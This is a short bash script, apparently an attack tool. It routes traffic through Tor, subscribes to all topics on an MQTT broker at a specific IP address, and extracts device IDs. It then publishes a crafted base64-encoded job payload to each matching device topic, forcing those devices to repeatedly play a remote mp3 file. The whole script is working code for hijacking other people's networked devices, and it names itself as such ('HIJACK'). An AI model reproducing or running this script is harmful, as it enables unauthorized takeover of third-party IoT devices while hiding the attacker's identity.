#!/bin/bash
# HIJACK_ALL_VOV_VERBOSE.sh - Peppe.mp3 EXPLICIT LOOP

PEPPER_PAYLOAD='[
  {
    "id":51886,
    "show_id":51886,
    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZS1icmVzY2lhLXBvZXRhIEhJSkFDSy1WT1YzIiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoyMTQ3NDgzNjMyLCJ0cyI6WzE3MjgwMF0sImRzIjpbMTcyODAsMTcyODBdLCJjcmVhdGVkIjoxNzY3NjM1MDAwLCJzdGFydCI6MTc2NzYzMjQwMCwiZXhwaXJlZCI6MTc2OTg3ODc5OSwiZmlsZXMiOlt7ImlkIjo1MTg4NiwiaW5kZXgiOjAsInR5cGUiOjEsInNpemUiOjEyMzQ1Niwic3MiOjEyMzQ1NiwidXJsIjoiaHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3BlcHBlLWJyZXNjaWEtcG9ldGEubXAzIn1dfQ==",
    "action":1,
    "description":"peppe-brescia-poeta.mp3",
    "version":1,
    "created_at":"2026-01-06T01:00:00.000000000+07:00"
  }
]'

echo "🎵 PEPPPE MP3: https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
echo "🔍 Scanning MQTT topics... (Ctrl+C to stop)"
echo "📡 Broker: 42.1.64.56:1883"

torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | while read -r line; do
  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:([0-9]+)\" ]]; then
    ID="${BASH_REMATCH[1]}"
    TYPE="${BASH_REMATCH[2]}"
    
    if [[ $TYPE == "16" ]]; then
      TOPIC="${ID}:d:16"
      echo "🎯 HIJACK: $TOPIC"
      echo "💉 Peppe.mp3 → $TOPIC"
      
      torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" && \
        echo "✅ PEPPPE LOADED: $TOPIC" || echo "❌ FAILED: $TOPIC"
      
      echo "---"
    fi
  fi
done
